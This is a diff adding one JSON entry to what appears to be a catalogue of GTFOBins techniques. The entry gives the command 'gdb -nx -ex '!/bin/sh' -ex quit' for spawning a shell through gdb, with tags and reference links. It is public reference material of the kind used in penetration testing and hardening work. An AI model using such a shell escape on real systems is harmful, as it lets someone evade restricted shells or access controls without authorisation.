@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-gdb-shell",
+  "name": "GTFOBins · gdb (shell)",
+  "command": "gdb -nx -ex '!/bin/sh' -ex quit",
+  "description": "Use gdb to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "gdb",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/gdb/#shell",
+  "upstream_id": "gdb/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/gdb/"
+    }
+  ]
+}
